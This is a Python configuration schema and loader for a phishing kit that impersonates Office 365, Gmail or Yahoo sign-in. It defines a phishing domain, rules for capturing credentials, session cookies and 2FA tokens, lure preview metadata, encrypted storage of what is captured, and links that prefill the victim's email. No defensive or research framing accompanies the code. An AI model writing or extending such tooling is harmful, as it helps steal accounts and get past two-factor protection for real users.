import json
import jsonschema
from jsonschema import validate
import logging
import os
import re
from cryptography.fernet import Fernet

CONFIG_SCHEMA = {
    "type": "object",
    "properties": {
        "service_name": {"type": "string", "enum": ["office365", "gmail", "yahoo"]},
        "target_domain": {"type": "string", "pattern": r"^[a-zA-Z0-9\-\.]+$"},
        "phishing_domain": {"type": "string", "pattern": r"^[a-zA-Z0-9\-\.]+$"},
        "port": {"type": "integer", "minimum": 1, "maximum": 65535},
        "ssl": {
            "type": "object",
            "properties": {
                "enabled": {"type": "boolean"},
                "cert_path": {"type": "string"},
                "key_path": {"type": "string"},
                "auto_generate": {"type": "boolean"},
                "lets_encrypt": {"type": "boolean"}
            },
            "required": ["enabled"]
        },
        "redirect_url": {"type": "string", "format": "uri"},
        "capture_rules": {
            "type": "object",
            "properties": {
                "credentials": {
                    "type": "array",
                    "items": {
                        "type": "object",
                        "properties": {
                            "field": {"type": "string"},
                            "selector": {"type": "string"}
                        },
                        "required": ["field", "selector"]
                    }
                },
                "cookies": {"type": "array", "items": {"type": "string"}},
                "2fa_token": {"type": "string"}
            },
            "required": ["credentials", "cookies"]
        },
        "lure": {
            "type": "object",
            "properties": {
                "og_title": {"type": "string"},
                "og_description": {"type": "string"},
                "og_image": {"type": "string"},
                "favicon": {"type": "string"}
            },
            "required": ["og_title", "og_description"]
        },
        "logging": {
            "type": "object",
            "properties": {
                "level": {"type": "string", "enum": ["DEBUG", "INFO", "WARNING", "ERROR"]},
                "file": {"type": "string"}
            },
            "required": ["level", "file"]
        },
        "storage": {
            "type": "object",
            "properties": {
                "database": {"type": "string"},
                "encrypt": {"type": "boolean"},
                "ttl_hours": {"type": "integer", "minimum": 0}
            },
            "required": ["database", "encrypt"]
        },
        "analytics": {
            "type": "object",
            "properties": {
                "enabled": {"type": "boolean"},
                "database": {"type": "string"}
            },
            "required": ["enabled"]
        },
        "link_format": {
            "type": "object",
            "properties": {
                "use_email_fragment": {"type": "boolean"},
                "prefill_email": {"type": "boolean"}
            },
            "required": ["use_email_fragment", "prefill_email"]
        }
    },
    "required": ["service_name", "target_domain", "phishing_domain", "port", "ssl", "redirect_url", "capture_rules", "lure", "logging", "storage", "analytics", "link_format"]
}

def load_config(config_file, encryption_key=None):
    try:
        with open(config_file, 'rb') as f:
            content = f.read()
        if encryption_key:
            cipher = Fernet(encryption_key)
            content = cipher.decrypt(content)
        config = json.loads(content)

        validate(instance=config, schema=CONFIG_SCHEMA)

        if config['ssl']['enabled'] and not config['ssl'].get('auto_generate') and not config['ssl'].get('lets_encrypt'):
            if not all(k in config['ssl'] for k in ['cert_path', 'key_path']):
                raise ValueError("SSL enabled but cert_path or key_path missing")
            if not os.path.exists(config['ssl']['cert_path']) or not os.path.exists(config['ssl']['key_path']):
                raise ValueError("SSL cert or key file not found")

        for rule in config['capture_rules']['credentials']:
            try:
                re.compile(rule['selector'])
            except re.error:
                raise ValueError(f"Invalid regex in capture rule: {rule['selector']}")
        if '2fa_token' in config['capture_rules']:
            try:
                re.compile(config['capture_rules']['2fa_token'])
            except re.error:
                raise ValueError(f"Invalid 2FA token regex: {config['capture_rules']['2fa_token']}")

        return config
    except Exception as e:
        logging.error(f"Config error: {e}")
        raise
